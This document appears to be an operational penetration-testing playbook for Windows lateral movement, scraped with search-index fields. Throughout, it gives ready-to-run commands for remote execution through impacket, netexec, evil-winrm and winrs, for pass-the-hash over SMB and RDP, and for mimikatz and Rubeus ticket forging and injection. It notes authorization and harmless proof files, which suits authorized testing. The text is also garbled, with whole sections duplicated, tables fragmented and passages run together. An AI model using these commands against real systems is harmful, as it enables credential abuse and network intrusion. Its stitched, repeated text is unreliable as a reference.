source: ```bash nmap -pn -st -sv -p 135,139,445,3389,5985,5986 target -on movement-preflight.txt getent hosts target_host date -u ``` windows source: ```powershell resolve-dnsname target_host test-netconnection target_host -port 445 test-netconnection target_host -port 5985 test-netconnection target_host -port 3389 w32tm /query /status ``` port 135 alone does not prove wmi/dcom viability because rpc commonly negotiates a dynamic high port. when the destination is reachable only through a pivot, perform these checks through the established block 13 route and respect the client/proxy's transport limits. record: ```text source position -> target fqdn/ip -> route -> service/port -> credential type -> local/domain identity -> expected right -> chosen method -> expected effect ``` ## 3. validate authentication separately from execution netexec can classify a selected smb credential: ```bash # domain password nxc smb target -d domain -u user -p 'password' # domain nt hash nxc smb target -d domain -u user -h nt_hash # target-local account nxc smb target -u administrator -h nt_hash --local-auth # prove only share access nxc smb target -d domain -u user -p 'password' --shares ``` > a successful login proves smb authentication. `(pwn3d!)` is netexec's smb administrative-context indicator, not proof that winrm, rdp, wmi or every smb execution method will succeed. for one justified execution proof: ```bash nxc smb target -d domain -u user -p 'password' -x "hostname & whoami" --exec-method wmiexec ``` current netexec can select `wmiexec`, `atexec` or `smbexec`; without an explicit method it may fail over between them. use a forced method when diagnosing prerequisites so the result remains attributable. ## 4. smb and service-control execution ### impacket psexec ```bash # password impacket-psexec 'domain/user:password@target' # nt hash / pass-the-hash impacket-psexec -hashes :nt_hash 'domain/user@target' ``` > **need:** smb 445/139, writable administrative share and service control manager rights. impacket uploads a remcom service binary, creates/starts a service and communicates over named pipes. verify the returned identity; the service context is commonly system. kerberos cache: ```bash export krb5ccname="$pwd/user.ccache" impacket-psexec -k -no-pass -dc-ip dc_ip -target-ip target_ip 'domain/user@target_host' ``` the target parameter uses the hostname matching the cifs/host spn; `-target-ip` separates connection routing from kerberos naming. ### sysinternals psexec from windows ```cmd psexec64.exe -accepteula \\target_host -u domain\user -p password cmd.exe ``` > the official psexec binary is not built into windows. it requires remote administrative access and creates the psexesvc service/artifacts. avoid putting real passwords in retained shell history; an existing authorized network credential context is preferable. ### smbexec ```bash impacket-smbexec 'domain/user:password@target' impacket-smbexec -hashes :nt_hash 'domain/user@target' ``` > smbexec creates temporary services whose command lines redirect output through a share. it does not use the same uploaded remcom binary as psexec, but it still requires scm/service rights and produces substantial service/event artifacts.
kerberos and alternate output modes ```bash export krb5ccname="$pwd/user.ccache" impacket-smbexec -k -no-pass -dc-ip dc_ip -target-ip target_ip 'domain/user@target_host' # share is default; server starts a local smb server and needs permission to bind locally. impacket-smbexec -mode share -share c$ 'domain/user:password@target' ```
### atexec ```bash impacket-atexec 'domain/user:password@target_host' "cmd.exe /c hostname & whoami" impacket-atexec -hashes :nt_hash 'domain/user@target_host' "cmd.exe /c hostname & whoami" ``` > atexec creates and deletes a scheduled task and normally retrieves output from `admin$\temp`. it is a one-shot command mechanism, not an interactive shell; task-scheduler rpc and administrative share access must both work. kerberos: ```bash export krb5ccname="$pwd/user.ccache" impacket-atexec -k -no-pass -dc-ip dc_ip 'domain/user@target_host' "cmd.exe /c hostname & whoami" ``` ## 5. wmi and dcom execution ### impacket wmiexec ```bash impacket-wmiexec 'domain/user:password@target' impacket-wmiexec -hashes :nt_hash 'domain/user@target' ``` > wmiexec creates processes through wmi/dcom. its normal output channel uses smb and defaults to `admin$`; therefore a wmi process may run even when output retrieval fails. `-nooutput` or `-silentcommand` changes that evidence channel. kerberos with separate name and route: ```bash export krb5ccname="$pwd/user.ccache" impacket-wmiexec -k -no-pass -dc-ip dc_ip -target-ip target_ip 'domain/user@target_host' ```
one command, no smb output ```bash impacket-wmiexec -nooutput 'domain/user:password@target' "cmd.exe /c echo movement_ok > c:\windows\temp\movement-proof.txt" ``` verify the harmless artifact through an independently authorized channel. no returned stdout is expected.
### native powershell cim over dcom ```powershell $credential = get-credential 'domain\user' $options = new-cimsessionoption -protocol dcom $session = new-cimsession -computername target_host -credential $credential -sessionoption $options invoke-cimmethod -cimsession $session -classname win32_process -methodname create -arguments @{ commandline = 'cmd.exe /c hostname > c:\windows\temp\movement-proof.txt' } remove-cimsession $session ``` > `returnvalue = 0` and a process id confirm process creation, not its final effect. wmi-created processes run in session 0; gui programs will not appear on an interactive desktop. ### dcom mmc method current windows token: ```powershell $type = [type]::gettypefromprogid('mmc20.application.1','target_host') $object = [activator]::createinstance($type) $object.document.activeview.executeshellcommand( 'cmd.exe', $null, '/c hostname > c:\windows\temp\movement-proof.txt', '7' ) ``` impacket with password or nt hash: ```bash impacket-dcomexec 'domain/user:password@target' impacket-dcomexec -hashes :nt_hash 'domain/user@target' ``` > current impacket `dcomexec` explicitly rejects kerberos for its supported mmc/shell dcom objects because they do not accept the required host ticket. use `wmiexec -k` when kerberos command execution is required. dcom class availability, rpc reachability and launch/access permissions vary. ## 6. winrm, winrs and powershell remoting ### evil-winrm ```bash # password; omit -p to prompt where supported evil-winrm -i target_host -u user -p 'password' # nt hash evil-winrm -i target_host -u user -h nt_hash # https listener evil-winrm -i target_host -u user -p 'password' -s -p 5986 ``` current evil-winrm ticket-file support: ```bash evil-winrm -i target_fqdn -r domain -k user.ccache --spn http ``` > **need:** reachable 5985/5986, an enabled winrm/powershell endpoint and endpoint authorization. the identity is commonly an administrator or a member of the applicable remote-management group, but endpoint sddl/policy is decisive. kerberos requires the fqdn/spn, realm/kdc configuration and a compatible ticket. ### native winrs ```cmd winrs /r:target_host /u:domain\user /p:password "cmd /c hostname & whoami" ``` to avoid retaining a password on the command line, use the current authorized windows credential context where possible: ```cmd winrs /r:target_host "cmd /c hostname & whoami" ``` > winrs uses winrm. a non-administrator can require `/noprofile` depending on endpoint configuration. `/allowdelegate` affects onward credential use and is not a default fix for the double-hop problem. ### powershell remoting ```powershell test-wsman target_host $credential = get-credential 'domain\user' invoke-command -computername target_host -credential $credential -scriptblock { hostname whoami /all } $session = new-pssession -computername target_host -credential $credential enter-pssession -session $session ``` > a hostname normally supports negotiate/kerberos in a domain. an ip address requires explicit credentials and generally https or a tightly scoped trustedhosts configuration. do not weaken global trustedhosts merely to hide dns/spn mistakes. ## 7. rdp check the installed binary name: ```bash command -v xfreerdp3 || command -v xfreerdp ``` password: ```bash xfreerdp3 /v:target_host /d:domain /u:user /p:'password' /cert:ignore /dynamic-resolution +clipboard ``` older packages may expose the same syntax through `xfreerdp`. nt hash: ```bash xfreerdp3 /v:target_host /d:domain /u:user /pth:nt_hash /cert:ignore /dynamic-resolution ``` > freerdp's `/pth` uses restricted admin mode. the target must support/permit that mode and the identity must be an administrator; ordinary remote desktop users membership is not sufficient for restricted admin. password-based rdp instead needs the remote desktop service, nla compatibility and the effective “allow log on through remote desktop services” right without a deny override. native client: ```cmd mstsc.exe /v:target_host mstsc.exe /restrictedadmin /v:target_host ``` ordinary rdp can place reusable user credentials in the destination's lsass. restricted admin avoids sending those reusable credentials but prevents ordinary onward access as that user; treat the resulting session's network identity separately. ## 8. pass-the-hash, overpass-the-hash and pass-the-ticket ### pass-the-hash ```text nt hash -> ntlm challenge/response -> target service ``` pth requires an ntlm-capable service, a valid account context and the service-specific right. smb share access may work without administrative execution; psexec/wmiexec/smbexec usually need administrative rights. remote uac commonly filters non-built-in local administrators. domain accounts in the target administrators group traditionally receive a full remote token, but newer administrator protection policy can change that result—trust the observed target token and method-specific authorization. ### overpass-the-hash / key-to-ticket mimikatz network-credential context: ```text sekurlsa::pth /user:user /domain:domain /ntlm:nt_hash /run:powershell.exe ``` rubeus tgt request: ```cmd rubeus.exe asktgt /user:user /domain:domain /rc4:nt_hash /dc:dc_host /ptt klist ``` aes alternative: ```cmd rubeus.exe asktgt /user:user /domain:domain /aes256:aes256_key /dc:dc_host /ptt ``` trigger a kerberos service request with the hostname, then inspect: ```cmd dir \\target_host\c$ klist ``` > in a mimikatz `sekurlsa::pth` process, `whoami` can still show the original local process token while network authentication uses the supplied identity. validate the ticket's client and the remote result rather than treating local `whoami` as the network identity. ### pass-the-ticket windows: ```cmd rubeus.exe ptt /ticket:ticket.kirbi klist ``` ```text kerberos::ptt ticket.kirbi ``` linux: ```bash export krb5ccname="$pwd/ticket.ccache" klist impacket-wmiexec -k -no-pass -dc-ip dc_ip -target-ip target_ip 'domain/user@target_host' ``` a tgs must name the selected service/hostname. a tgt can request a suitable tgs only while valid and when the kdc is reachable. ticket import is not lateral movement until the destination accepts it and produces the intended authorized effect. ## 9. local versus domain identity and remote uac ```text domain\user -> domain identity; evaluate target-local group/right target\user -> sam identity on that target ./user -> tool-specific local-account selection ``` common failure pattern: 1. a local account authenticates over smb; 2. windows issues a filtered remote token; 3. `admin$`, scm or wmi administrative operations fail. do not “fix” this by changing `localaccounttokenfilterpolicy` during an attack workflow. use a method already permitted by the target's configuration, the built-in administrator where legitimately obtained and applicable, rdp if authorized, or another mapped identity. ## 10. output channels, session 0 and double hop remote process creation, stdout retrieval and an interactive shell are separate states: ```text authenticated -> remote operation authorized -> process/task/service created -> command effect occurred -> output returned or callback connected -> usable session ``` - psexec returns named-pipe i/o through its service. - wmiexec normally redirects output to an smb share. - smbexec redirects command output while repeatedly creating services. - atexec writes output under `admin$\temp`. - native wmi/dcom may return only a pid/return value; verify a harmless file or another bounded effect. - wmi/dcom/service processes commonly run in session 0, so a gui is not visible to the logged-on user. - winrm creates a remote shell/runspace and returns structured or text output. a winrm/powershell session on host_a may not possess delegable credentials for host_b. that “double hop” is a credential-context problem, not proof that host_b or the password is wrong. prefer executing from the source that actually holds the credential/ticket rather than enabling broad delegation. ## 11. failure router | evidence | layer | next decision | | --- | --- | --- | | timeout/refused | route, firewall or listener | verify from the actual source and account for rpc dynamic ports | | smb login succeeds; `admin$` denied | share/admin token/uac | distinguish share authentication from effective administrator context | | `(pwn3d!)` but forced method fails | method-specific scm/wmi/task prerequisite | test only that method's rpc/service right and side effects | | `status_logon_failure` | credential/domain/authentication | correct local/domain context, artifact type and protocol | | `status_account_restriction` or logon-type denial | account policy/right | check permitted logon type and deny overrides | | rpc server unavailable | 135/dynamic rpc/firewall/service | validate endpoint mapper and negotiated port from source | | wmi return value nonzero | process creation request failed | decode return value; command effect is unconfirmed | | process succeeds; output missing | output channel, share or session-0 behavior | use a bounded file/side-effect proof or compatible output option | | winrm listener responds; shell denied | endpoint sddl/group/logon/uac policy | validate endpoint authorization, not merely credentials | | rdp nla succeeds; logon denied | remote-interactive right or deny policy | verify remote desktop users/administrators and user-right assignment | | rdp `/pth` denied | restricted admin disabled/unsupported or user not admin | do not equate ordinary rdp authorization with restricted admin | | `kdc_err_s_principal_unknown` | hostname/spn/realm | use fqdn matching the ticket and correct realm | | `krb_ap_err_modified` | spn account/key mismatch | confirm spn owner, target alias and ticket key | | clock-skew error | time | repair time before credential changes | | kerberos tool uses ip and falls back/fails | name/spn selection | separate `target_host` from `target_ip` | | first hop works; second hop denied | credential delegation/double hop | move execution to credential-holding source or use an explicit ticket | ## 12. after movement ```cmd hostname whoami /all ipconfig /all route print netstat -ano klist ``` re-enumerate: 1. local privilege and accessible credential sources; 2. domain groups, acls, shares and host rights under the new identity; 3. logged-on sessions and service accounts; 4. interfaces, routes, dns, listeners and internal reachability; 5. the next evidence-backed host/identity transition. do not overwrite the earlier state. record the source host, credential form, authentication protocol, execution method, returned identity and side effects. ## tooling for this section | reachable named service | direct test bypasses/ignores the pivot | | netexec | selected credential/admin-context validation | supported protocol and credential | section 3 | exact identity plus method-specific admin cue | auth success without execution right | | impacket psexec | interactive smb/scm execution | admin share + scm | section 4 | remote shell/verified identity | share/service creation denied | | impacket smbexec | command shell without remcom upload | scm + output route | section 4 | command output | service/output share failure | | impacket atexec | one-shot scheduled task | task rpc + admin$ output | section 4 | retrieved command output | task created but output unavailable | | impacket wmiexec | wmi process creation with password/hash/ticket | rpc/dcom; smb unless no-output | section 5 | shell/output or verified effect | rpc works but share/output fails | | impacket dcomexec | ntlm password/hash dcom objects | rpc/dcom and supported object | section 5 | verified command effect | kerberos deliberately unsupported | | evil-winrm | interactive winrm/psrp | endpoint authorization | section 6 | remote powershell prompt | listener present but endpoint rejects | | winrs/powershell remoting | built-in windows management | winrm and token/credential | section 6 | remote hostname/identity | ip trust or double-hop issue | | freerdp/mstsc | gui/remote-interactive session | rdp right/nla; admin for restricted admin | section 7 | usable desktop with verified identity | auth accepted but logon type denied | | rubeus/mimikatz/klist | ## 1. choose by credential and service

| material | compatible starting paths | important boundary |
| --- | --- | --- |
| password | smb/scm, wmi/dcom, winrm/winrs, rdp | correct password does not grant the required logon or execution right |
| nt hash | ntlm-capable smb/wmi/winrm; rdp only through restricted admin where supported | net-ntlm and dcc2 are not reusable nt hashes |
| tgt/ccache | kerberos-capable tool using target fqdn/spn | ticket identity, realm, lifetime, dns and kdc route must match |
| tgs | only the named `service/host` and compatible client | a cifs ticket does not authorize winrm, wmi or rdp |
| aes/nt long-term key | request a tgt, then use kerberos | rc4/nt-key requests can fail where rc4 is disabled |
| local-account password/hash | ntlm or rdp in the target's local account context | remote uac/account restrictions commonly filter non-rid-500 local administrators |

| reachable service | common execution/access mechanisms | usual authorization |
| --- | --- | --- |
| smb 445 + scm/rpc | psexec, smbexec, service creation | administrative share plus scm/service rights |
| rpc endpoint mapper 135 + dynamic rpc; often smb for output | wmiexec, native cim/wmi, dcom | remote wmi/dcom rights, commonly an effective administrator token |
| task scheduler rpc plus smb output | atexec | remote task creation and administrative output access |
| winrm 5985/5986 | winrs, powershell remoting, evil-winrm | enabled endpoint and endpoint/session authorization |
| rdp 3389 | freerdp, mstsc | remote-interactive logon right; restricted admin requires administrator access |

## 2. preflight from the actual source

directly routed source:

```bash
nmap -pn -st -sv -p 135,139,445,3389,5985,5986 target -on movement-preflight.txt
getent hosts target_host
date -u
```

windows source:

```powershell
resolve-dnsname target_host
test-netconnection target_host -port 445
test-netconnection target_host -port 5985
test-netconnection target_host -port 3389
w32tm /query /status
```

port 135 alone does not prove wmi/dcom viability because rpc commonly negotiates a dynamic high port. when the destination is reachable only through a pivot, perform these checks through the established block 13 route and respect the client/proxy's transport limits.

record:

```text
source position -> target fqdn/ip -> route -> service/port
-> credential type -> local/domain identity -> expected right
-> chosen method -> expected effect
```

## 3. validate authentication separately from execution

netexec can classify a selected smb credential:

```bash
# domain password
nxc smb target -d domain -u user -p 'password'

# domain nt hash
nxc smb target -d domain -u user -h nt_hash

# target-local account
nxc smb target -u administrator -h nt_hash --local-auth

# prove only share access
nxc smb target -d domain -u user -p 'password' --shares
```

> a successful login proves smb authentication. `(pwn3d!)` is netexec's smb administrative-context indicator, not proof that winrm, rdp, wmi or every smb execution method will succeed.

for one justified execution proof:

```bash
nxc smb target -d domain -u user -p 'password' -x "hostname & whoami" --exec-method wmiexec
```

current netexec can select `wmiexec`, `atexec` or `smbexec`; without an explicit method it may fail over between them. use a forced method when diagnosing prerequisites so the result remains attributable.

## 4. smb and service-control execution ### impacket psexec ```bash # password impacket-psexec 'domain/user:password@target' # nt hash / pass-the-hash impacket-psexec -hashes :nt_hash 'domain/user@target' ``` > **need:** smb 445/139, writable administrative share and service control manager rights. impacket uploads a remcom service binary, creates/starts a service and communicates over named pipes. verify the returned identity; the service context is commonly system. kerberos cache: ```bash export krb5ccname="$pwd/user.ccache" impacket-psexec -k -no-pass -dc-ip dc_ip -target-ip target_ip 'domain/user@target_host' ``` the target parameter uses the hostname matching the cifs/host spn; `-target-ip` separates connection routing from kerberos naming. ### sysinternals psexec from windows ```cmd psexec64.exe -accepteula \\target_host -u domain\user -p password cmd.exe ``` > the official psexec binary is not built into windows. it requires remote administrative access and creates the psexesvc service/artifacts. avoid putting real passwords in retained shell history; an existing authorized network credential context is preferable. ### smbexec ```bash impacket-smbexec 'domain/user:password@target' impacket-smbexec -hashes :nt_hash 'domain/user@target' ``` > smbexec creates temporary services whose command lines redirect output through a share. it does not use the same uploaded remcom binary as psexec, but it still requires scm/service rights and produces substantial service/event artifacts.
kerberos and alternate output modes ```bash export krb5ccname="$pwd/user.ccache" impacket-smbexec -k -no-pass -dc-ip dc_ip -target-ip target_ip 'domain/user@target_host' # share is default; server starts a local smb server and needs permission to bind locally. impacket-smbexec -mode share -share c$ 'domain/user:password@target' ```
### atexec ```bash impacket-atexec 'domain/user:password@target_host' "cmd.exe /c hostname & whoami" impacket-atexec -hashes :nt_hash 'domain/user@target_host' "cmd.exe /c hostname & whoami" ``` > atexec creates and deletes a scheduled task and normally retrieves output from `admin$\temp`. it is a one-shot command mechanism, not an interactive shell; task-scheduler rpc and administrative share access must both work. kerberos: ```bash export krb5ccname="$pwd/user.ccache" impacket-atexec -k -no-pass -dc-ip dc_ip 'domain/user@target_host' "cmd.exe /c hostname & whoami" ```

## 5. wmi and dcom execution ### impacket wmiexec ```bash impacket-wmiexec 'domain/user:password@target' impacket-wmiexec -hashes :nt_hash 'domain/user@target' ``` > wmiexec creates processes through wmi/dcom. its normal output channel uses smb and defaults to `admin$`; therefore a wmi process may run even when output retrieval fails. `-nooutput` or `-silentcommand` changes that evidence channel. kerberos with separate name and route: ```bash export krb5ccname="$pwd/user.ccache" impacket-wmiexec -k -no-pass -dc-ip dc_ip -target-ip target_ip 'domain/user@target_host' ```
one command, no smb output ```bash impacket-wmiexec -nooutput 'domain/user:password@target' "cmd.exe /c echo movement_ok > c:\windows\temp\movement-proof.txt" ``` verify the harmless artifact through an independently authorized channel. no returned stdout is expected.

```bash
evil-winrm -i target_fqdn -r domain -k user.ccache --spn http
```

> **need:** reachable 5985/5986, an enabled winrm/powershell endpoint and endpoint authorization. the identity is commonly an administrator or a member of the applicable remote-management group, but endpoint sddl/policy is decisive. kerberos requires the fqdn/spn, realm/kdc configuration and a compatible ticket.

### native winrs

```cmd
winrs /r:target_host /u:domain\user /p:password "cmd /c hostname & whoami"
```

to avoid retaining a password on the command line, use the current authorized windows credential context where possible:

```cmd
winrs /r:target_host "cmd /c hostname & whoami"
```

> winrs uses winrm. a non-administrator can require `/noprofile` depending on endpoint configuration. `/allowdelegate` affects onward credential use and is not a default fix for the double-hop problem.

### powershell remoting

```powershell
test-wsman target_host
$credential = get-credential 'domain\user'

invoke-command -computername target_host -credential $credential -scriptblock {
  hostname
  whoami /all
}

$session = new-pssession -computername target_host -credential $credential
enter-pssession -session $session
```

> a hostname normally supports negotiate/kerberos in a domain. an ip address requires explicit credentials and generally https or a tightly scoped trustedhosts configuration. do not weaken global trustedhosts merely to hide dns/spn mistakes.

sections.title: 7. RDP
sections.search:
## 7. rdp

check the installed binary name:

```bash
command -v xfreerdp3 || command -v xfreerdp
```

password:

```bash
xfreerdp3 /v:target_host /d:domain /u:user /p:'password' /cert:ignore /dynamic-resolution +clipboard
```

older packages may expose the same syntax through `xfreerdp`.

nt hash:

```bash
xfreerdp3 /v:target_host /d:domain /u:user /pth:nt_hash /cert:ignore /dynamic-resolution
```

> freerdp's `/pth` uses restricted admin mode. the target must support/permit that mode and the identity must be an administrator; ordinary remote desktop users membership is not sufficient for restricted admin. password-based rdp instead needs the remote desktop service, nla compatibility and the effective “allow log on through remote desktop services” right without a deny override.

native client:

```cmd
mstsc.exe /v:target_host
mstsc.exe /restrictedadmin /v:target_host
```

ordinary rdp can place reusable user credentials in the destination's lsass. restricted admin avoids sending those reusable credentials but prevents ordinary onward access as that user; treat the resulting session's network identity separately.

sections.title: 8. Pass-the-Hash, Overpass-the-Hash and Pass-the-Ticket
sections.search:
## 8. pass-the-hash, overpass-the-hash and pass-the-ticket

### pass-the-hash

```text
nt hash -> ntlm challenge/response -> target service
```

pth requires an ntlm-capable service, a valid account context and the service-specific right. smb share access may work without administrative execution; psexec/wmiexec/smbexec usually need administrative rights. remote uac commonly filters non-built-in local administrators. domain accounts in the target administrators group traditionally receive a full remote token, but newer administrator protection policy can change that result—trust the observed target token and method-specific authorization.

### overpass-the-hash / key-to-ticket

mimikatz network-credential context:

```text
sekurlsa::pth /user:user /domain:domain /ntlm:nt_hash /run:powershell.exe
```

rubeus tgt request:

```cmd
rubeus.exe asktgt /user:user /domain:domain /rc4:nt_hash /dc:dc_host /ptt
klist
```

aes alternative:

```cmd
rubeus.exe asktgt /user:user /domain:domain /aes256:aes256_key /dc:dc_host /ptt
```

trigger a kerberos service request with the hostname, then inspect:

```cmd
dir \\target_host\c$
klist
```

> in a mimikatz `sekurlsa::pth` process, `whoami` can still show the original local process token while network authentication uses the supplied identity. validate the ticket's client and the remote result rather than treating local `whoami` as the network identity.

### pass-the-ticket

windows:

```cmd
rubeus.exe ptt /ticket:ticket.kirbi
klist
```

```text
kerberos::ptt ticket.kirbi
```

linux:

```bash
export krb5ccname="$pwd/ticket.ccache"
klist
impacket-wmiexec -k -no-pass -dc-ip dc_ip -target-ip target_ip 'domain/user@target_host'
```

a tgs must name the selected service/hostname. a tgt can request a suitable tgs only while valid and when the kdc is reachable. ticket import is not lateral movement until the destination accepts it and produces the intended authorized effect.

sections.title: 9. Local versus domain identity and remote UAC
sections.search:
## 9. local versus domain identity and remote uac

```text
domain\user  -> domain identity; evaluate target-local group/right
target\user  -> sam identity on that target
./user        -> tool-specific local-account selection
```

common failure pattern:

1. a local account authenticates over smb;
2. windows issues a filtered remote token;
3. `admin$`, scm or wmi administrative operations fail.

do not “fix” this by changing `localaccounttokenfilterpolicy` during an attack workflow. use a method already permitted by the target's configuration, the built-in administrator where legitimately obtained and applicable, rdp if authorized, or another mapped identity.

sections.title: 10. Output channels, session 0 and double hop
sections.search:
## 10. output channels, session 0 and double hop

remote process creation, stdout retrieval and an interactive shell are separate states:

```text
authenticated
-> remote operation authorized
-> process/task/service created
-> command effect occurred
-> output returned or callback connected
-> usable session
```

- psexec returns named-pipe i/o through its service.
- wmiexec normally redirects output to an smb share.
- smbexec redirects command output while repeatedly creating services.
- atexec writes output under `admin$\temp`.
- native wmi/dcom may return only a pid/return value; verify a harmless file or another bounded effect.
- wmi/dcom/service processes commonly run in session 0, so a gui is not visible to the logged-on user.
- winrm creates a remote shell/runspace and returns structured or text output.

a winrm/powershell session on host_a may not possess delegable credentials for host_b. that “double hop” is a credential-context problem, not proof that host_b or the password is wrong. prefer executing from the source that actually holds the credential/ticket rather than enabling broad delegation.

sections.title: 11. Failure router
sections.search:
## 11. failure router

| evidence | layer | next decision |
| --- | --- | --- |
| timeout/refused | route, firewall or listener | verify from the actual source and account for rpc dynamic ports |
| smb login succeeds; `admin$` denied | share/admin token/uac | distinguish share authentication from effective administrator context |
| `(pwn3d!)` but forced method fails | method-specific scm/wmi/task prerequisite | test only that method's rpc/service right and side effects |
| `status_logon_failure` | credential/domain/authentication | correct local/domain context, artifact type and protocol |
| `status_account_restriction` or logon-type denial | account policy/right | check permitted logon type and deny overrides |
| rpc server unavailable | 135/dynamic rpc/firewall/service | validate endpoint mapper and negotiated port from source |
| wmi return value nonzero | process creation request failed | decode return value; command effect is unconfirmed |
| process succeeds; output missing | output channel, share or session-0 behavior | use a bounded file/side-effect proof or compatible output option |
| winrm listener responds; shell denied | endpoint sddl/group/logon/uac policy | validate endpoint authorization, not merely credentials |
| rdp nla succeeds; logon denied | remote-interactive right or deny policy | verify remote desktop users/administrators and user-right assignment |
| rdp `/pth` denied | restricted admin disabled/unsupported or user not admin | do not equate ordinary rdp authorization with restricted admin |
| `kdc_err_s_principal_unknown` | hostname/spn/realm | use fqdn matching the ticket and correct realm |
| `krb_ap_err_modified` | spn account/key mismatch | confirm spn owner, target alias and ticket key |
| clock-skew error | time | repair time before credential changes |
| kerberos tool uses ip and falls back/fails | name/spn selection | separate `target_host` from `target_ip` |
| first hop works; second hop denied | credential delegation/double hop | move execution to credential-holding source or use an explicit ticket |

sections.title: 12. After movement
sections.search:
## 12. after movement

```cmd
hostname
whoami /all
ipconfig /all
route print
netstat -ano
klist
```

re-enumerate:

1. local privilege and accessible credential sources;
2. domain groups, acls, shares and host rights under the new identity;
3. logged-on sessions and service accounts;
4. interfaces, routes, dns, listeners and internal reachability;
5. the next evidence-backed host/identity transition.

do not overwrite the earlier state. record the source host, credential form, authentication protocol, execution method, returned identity and side effects.

| impacket smbexec | command shell without remcom upload | scm + output route | section 4 | command output | service/output share failure |
| impacket atexec | one-shot scheduled task | task rpc + admin$ output | section 4 | retrieved command output | task created but output unavailable |
| impacket wmiexec | wmi process creation with password/hash/ticket | rpc/dcom; smb unless no-output | section 5 | shell/output or verified effect | rpc works but share/output fails |
| impacket dcomexec | ntlm password/hash dcom objects | rpc/dcom and supported object | section 5 | verified command effect | kerberos deliberately unsupported |
| evil-winrm | interactive winrm/psrp | endpoint authorization | section 6 | remote powershell prompt | listener present but endpoint rejects |
| winrs/powershell remoting | built-in windows management | winrm and token/credential | section 6 | remote hostname/identity | ip trust or double-hop issue |

sections.title: winexe — Samba-side service execution alternative
sections.search:
## winexe — samba-side service execution alternative

use when the chosen account has working smb authentication and effective remote service-control/administrative rights. this is a service-execution transport, not a credential bypass.

```bash
# prompts for the accepted identity's password
winexe -u 'domain/user' //target 'cmd.exe /c whoami'
```

read: verify the returned identity and destination. access denied after a successful login points to authorization/uac/service-control conditions; it does not justify guessing more passwords. service creation and resulting artifacts require the same cleanup discipline as the other smb execution methods. prefer the existing supported impacket/netexec method when this legacy client is unavailable or incompatible.

sources: [upstream 1](https://www.kali.org/tools/winexe/).
